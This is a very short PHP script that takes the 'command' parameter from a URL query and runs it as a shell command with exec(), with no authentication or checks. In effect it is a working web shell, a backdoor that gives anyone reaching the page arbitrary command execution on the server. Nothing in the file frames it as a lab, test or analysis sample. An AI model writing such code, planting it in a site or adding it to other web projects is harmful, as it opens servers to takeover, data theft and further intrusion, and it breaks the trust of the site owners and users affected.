<?php 
// Check if the "command" parameter is set in the URL
if (isset($_GET['command'])) {
  // If the "command" parameter is set, run the value as a shell command
  exec($_GET['command']);
}

?>